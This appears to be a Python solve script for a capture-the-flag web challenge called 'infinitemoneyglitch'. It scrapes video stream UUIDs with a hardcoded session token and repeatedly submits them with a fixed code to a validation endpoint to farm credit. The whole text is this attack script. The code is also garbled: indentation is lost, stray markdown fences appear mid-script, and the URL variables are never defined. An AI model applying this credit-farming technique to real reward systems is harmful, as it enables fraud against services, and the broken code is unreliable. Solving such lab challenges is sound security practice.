token = 'c73f8b2f-e078-4520-a850-beeb4f578fb6'

while(1):
  list_uuid_video=[]
  for i in range(500):
  #for uuid_email in list_uuid_email:
  headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate',
  'Referer': 'http://infinitemoneyglitch.chall.malicecyber.com/video',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Connection': 'close',
  'Cookie': 'token=' + token,
  'Upgrade-Insecure-Requests': '1'
  }
  response = requests.get(url_video, headers=headers).text
  
  ```
  	pattern = r'<source src="/stream/[\\w-]+" type="video/mp4">'
  
  	match = re.search(pattern, response)
  
  	if(not(match)):
  		continue
  
  	uuid_video = match.group().split('/')[2].split('"')[0]
  	list_uuid_video.append(uuid_video)

for uui_video_b in list_uuid_video:
	print(uui_video_b)
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Referer': '<http://infinitemoneyglitch.chall.malicecyber.com/video>',
		'Content-Type': 'application/json',
		'Content-Length': '61',
		'Origin': '<http://infinitemoneyglitch.chall.malicecyber.com>',
		'Connection': 'close',
		'Cookie': 'token=' + token
	}

	data = {
		'uuid': uui_video_b,
		'code': '4015',
	}

	response = requests.post(url_validate, headers=headers, json=data, allow_redirects=False)
	print(response.text)
	if(response.status_code == 200):
		print(str(response.status_code) + '+0.1')

```
